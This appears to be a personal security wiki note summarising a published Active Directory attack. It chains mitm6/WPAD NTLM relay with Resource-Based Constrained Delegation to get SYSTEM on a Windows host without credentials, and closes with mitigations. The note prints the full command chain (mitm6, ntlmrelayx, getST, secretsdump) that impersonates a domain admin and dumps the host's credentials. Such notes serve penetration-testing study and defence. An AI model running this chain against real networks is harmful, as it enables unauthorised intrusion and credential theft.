---
title: RBCD via NTLM Relay (mitm6 + WPAD, no creds)
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, ntlm, relay, rbcd, delegation, mitm6]
source: raw/rbcd_delegation.md
---

# RBCD via NTLM Relay (mitm6 + WPAD, no creds)

> Source: `raw/rbcd_delegation.md` — dirkjanm.io, "The worst of both worlds:
> Combining NTLM Relaying and Kerberos delegation"

## Summary

A fully credential-less path to SYSTEM on a target Windows host, requiring
only local network access. Combines [[ntlm-relay-coercion|mitm6/WPAD NTLM
relay]] with [[kerberos-delegation-abuse|Resource-Based Constrained
Delegation (RBCD)]].

## Why it works

Computer accounts can modify some of their own LDAP attributes, including
`msDS-AllowedToActOnBehalfOfOtherIdentity` — the attribute that grants RBCD
rights. If an attacker relays a computer account's NTLM auth to LDAPS, they
authenticate *as* that computer and can set this attribute to point at an
attacker-controlled principal.

## Chain

1. **DNS takeover**: `sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd`
   — takes over IPv6 DNS for the target host via DHCPv6 (works even in
   IPv4-only networks since Windows still queries for IPv6).
2. **Relay + delegation setup**:
   ```bash
   ntlmrelayx.py -t ldaps://icorp-dc.internal.corp -wh attacker-wpad --delegate-access
   ```
   `-wh attacker-wpad` spoofs the WPAD location so the victim authenticates
   to the attacker's proxy over HTTP. `--delegate-access` makes ntlmrelayx,
   on receiving the relayed auth:
   - create a new computer account (default Machine Account Quota allows
     any user/computer to create up to 10), and
   - write that new account into the victim's
     `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD).
3. **Wait** for the victim to query DHCPv6/WPAD (best odds: reboot or
   network reconnect — early mornings on long engagements).
4. **S4U2Proxy** — get a service ticket impersonating a privileged user
   (e.g. a Domain Admin) to the victim host:
   ```bash
   python getST.py -spn cifs/icorp-w10.internal.corp 'internal.corp/NEW_COMPUTER$:password' -impersonate admin
   ```
5. **Exploit**:
   ```bash
   export KRB5CCNAME=admin.ccache
   python secretsdump.py -k -no-pass icorp-w10.internal.corp
   ```
   Ticket is scoped to the one SPN/host requested — not a domain-wide
   credential, but full control of that host.

## Other coercion avenues (per source)

- Any HTTP connection to a host in the Windows "Intranet Zone" (with
  automatic intranet detection on) is relayable the same way — not just via
  WPAD.
- WebDAV (Elad Shamir's original writeup).
- PrivExchange — Exchange authenticates as SYSTEM if unpatched.

## Mitigations

- **mitm6**: block DHCPv6-In/Out and ICMPv6 Router Advertisement-In via GPO
  firewall rules if IPv6 unused.
- **WPAD**: disable via GPO + disable `WinHttpAutoProxySvc`.
- **LDAP relay**: enable LDAP signing *and* LDAP channel binding — the only
  effective mitigation for this step.
- **RBCD abuse generally**: hard to mitigate (legitimate Kerberos feature).
  Reduce blast radius via Protected Users / "cannot be delegated" flag on
  Tier-0 accounts, and set **Machine Account Quota = 0** to remove the
  no-creds computer-account-creation primitive.

## Links

- [[kerberos-delegation-abuse]] — RBCD mechanics (this is the "no creds"
  variant of that chain — Machine Account Quota abuse, just reached via
  relay instead of direct LDAP access)
- [[ntlm-relay-coercion]] — mitm6/WPAD relay primitive in general
- [[acl-abuse]] — writing `msDS-AllowedToActOnBehalfOfOtherIdentity` is the
  same GenericWrite/self-write primitive as the ACL-based RBCD path

## References

- [dirkjanm.io: Worst of both worlds](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
</content>
